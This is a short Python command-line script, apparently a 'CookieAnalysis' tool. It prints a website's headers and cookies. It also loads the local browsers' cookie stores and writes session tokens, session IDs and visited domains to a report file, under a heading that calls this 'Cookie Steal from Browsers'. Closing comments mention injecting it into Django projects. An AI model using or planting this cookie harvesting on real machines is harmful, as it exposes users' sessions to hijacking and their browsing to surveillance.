# -*- coding: utf-8 -*-

try:
	import wrapper as browser_m
except:
	from CookieAnalysis import wrapper as browser_m


import requests
import sys


def line(): return print('-'*80)


def heading(HeadingName): return print(
    '\n'+'-'*35, HeadingName, '-'*35+'\n')


def analyize_web(url_):
    url = url_  # 'https://github.com'  # 'https://vtop.vit.ac.in/vtop/initialProcess'
    try:
        r = requests.get(url)
    except:
        print('[!] Recheck the provided link')

    heading('Header')
    for k in r.headers:
        print(k+':', r.headers[k])
    line()

    heading('Cookies')
    cjl = [str(x) for x in r.cookies]
    for x in cjl:
        print(x)
    line()

    heading('JSON Response')
    print(r.json)
    line()

# --------------------------------


def steal_analyizer():
    f = open('Browser_Analysis_Report.txt', 'w')
    f.close()
    def line(): return '-'*80

    def heading(HeadingName): return '\n\n\n'+'-' * \
        35+' '+HeadingName+' '+'-'*35+'\n\n\n'

    with open('Browser_Analysis_Report.txt', 'a+') as f:
        f.write(heading('Cookie Steal from Browsers'))
        cj = browser_m.load()  # browser_cookie3.load()
        f.write(heading('Tokens in Cookie'))
        cjl = [str(x) for x in cj]
        for x in cjl:
            if 'token' in x:
                f.write(x+'\n')
        f.write(line())

        f.write(heading('SessionIDs in Cookie'))
        cjl = [str(x) for x in cj]
        for x in cjl:
            if 'session' in x.lower():
                f.write(x+'\n')
        f.write(line())

        f.write(heading('Websites Visited'))
        already = dict()
        for cookie_ in cj:
            if cookie_.domain not in already:
                already[cookie_.domain] = '1'
                f.write(cookie_.domain+'\n')
        f.write(line())


def ssearch():
    cj = browser_m.load()
    cjl = [str(x) for x in cj]
    heading('Specific WebSearch')
    name = input('Give Website Name: ')
    flag = 0
    for x in cjl:
        if name in x:
            print(x)
            flag = 1
    if flag == 0:
        print('[+] Data Not Present\n')


if __name__ == '__main__':
    try:
        if sys.argv[1] == 'web':
            analyize_web(sys.argv[2])
        elif sys.argv[1] == 'browser':
            steal_analyizer()
        elif sys.argv[1] == 'search':
            ssearch()
        else:
            print('\n[*] Use Parameters (web site_name) (browser) (search)')
    except Exception as e:
        print('[!]', e)
        print('[!] Pass Parameters')
        print('\n[*] Use Parameters (web site_name) (browser) (search)')

# ------------------------
# inject script
# inject in django projects
